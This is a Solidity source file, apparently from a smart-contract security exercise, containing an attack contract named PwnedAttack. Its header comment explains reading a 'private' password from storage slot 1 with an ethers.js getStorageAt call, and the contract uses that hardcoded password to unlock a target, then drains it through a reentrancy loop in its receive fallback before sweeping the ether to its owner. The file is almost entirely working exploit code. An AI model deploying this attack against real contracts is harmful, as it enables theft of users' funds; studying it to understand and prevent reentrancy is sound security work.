pragma solidity ^0.8.13;
import "hardhat/console.sol";

/** In public blockchain like ethereum , you can NOT hide anything in the state variables by declaring the variable as private.
    All the variables private, public, are visible on the blockchain and can be accessed if we know the storgae location of the 
    smart contract.

    Get the password set by the private state variable of the contract, through the ethers.js library
    you can read the hex password -- read the blockchain variable by the following the etherjs command

    await ethers.provider.getStorageAt("DepolyedContractAddress Here",1)
    await contract.unlock(password);


    The locked variable is stored at location 1 and when you query it with the above command, if would spit out the password set while
    deploying the contract through constructor.


    The Pwned contract can be hacked by accessing the password and then using the reentrancy attach by calling the deposit method followed by withdraw method
    till the contract balance becomes zero.

    The password is hacked by ethers js library

    this contract then make use of the password to initiate the re-entrancy attack */

contract PwnedAttack {
  address payable pwnedContractAddr;
  address public owner;
  bytes32 public password =
    0x0000000000000000000000000000000000000000000000000000006d6168616d;

  constructor(address payable _pwnedAddress) public {
    pwnedContractAddr = _pwnedAddress;
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "only owner can call this method");
    _;
  }

  /**
   * @dev unlock the Pwned contract variable with the hacked password.
   * -
   * Calls the unlock method of Pwned contract using the encodeWithSignature method by passing the password as the argument.
   */

  function unlockContract() public {
    bytes memory passwordData = abi.encodeWithSignature(
      "unlock(bytes32)",
      password
    );
    pwnedContractAddr.call(passwordData);
  }

  /**
   * @dev Calls the Pwned contract deposit method by sending some ether.
   *
   * This method/function will call the Pwned contract deposit methos by sending some ether.
   */
  function depositInto() public payable {
    require(msg.value > 0.01 ether, "Please call donate with 0.001 ETH.");
    bytes memory payload = abi.encodeWithSignature(
      "deposit(address)",
      address(this)
    );
    (bool success, ) = pwnedContractAddr.call{ value: msg.value }(payload);
    require(
      success,
      "Transaction call using encodeWithSignature is successful"
    );
  }

  /**
   * @dev This method attacks the Pwned contract by calling its withdraw method recursively.
   * The re-entrancy is possible because of the balances being updated at the end of the contract interaction
   * instead of before.
   * .
   */
  function maliciousWithdraw() public {
    bytes memory payload = abi.encodeWithSignature(
      "withdraw(uint256)",
      1 ether
    );
    pwnedContractAddr.call(payload);
  }

  /**
   * @dev This attack contract has a malicious receive fallback function.
   *      that calls maliciousWithdraw again which calls withdraw!
   *      This is how the reentrancy attack works.
   *
   */
  receive() external payable {
    uint256 balance = pwnedContractAddr.balance;
    console.log("the balance is ");
    console.log(balance);
    if (balance >= 1 ether) {
      maliciousWithdraw();
    }
  }

  /**
   * @dev Helper function to check the balance of this contract.
   */
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }

  /**
   * @dev Get the balance from the contract to the wallet.
   */
  function withdraw() public onlyOwner {
    payable(msg.sender).transfer(address(this).balance);
  }
}
